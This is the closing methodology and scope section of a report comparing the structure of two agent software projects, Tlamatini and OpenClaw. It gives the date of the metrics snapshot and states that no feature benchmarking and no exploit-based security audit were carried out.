The metrics in Section 4 are computed against the working trees as of `2026-04-29`. Numbers will drift as both projects evolve; the **shapes** of the comparisons (concentration vs distribution, single-user vs multi-tenant, local-first vs multi-cloud, visual designer vs gateway) are stable structural traits and should remain valid across many revisions.

This report does not attempt a feature-by-feature head-to-head on agent capabilities (e.g. "does Tlamatini's Crawler beat OpenClaw's browser extension at task X?"). Such micro-benchmarks would require running both systems against a common task corpus, and are out of scope for a structural comparison.

This report does not perform a security audit in the ethical-hacking sense — no CVEs were filed, no exploits attempted, no published vulnerabilities were investigated against either codebase. The security comparison is on policy and posture, not on exploit surface.

---

*End of document.*
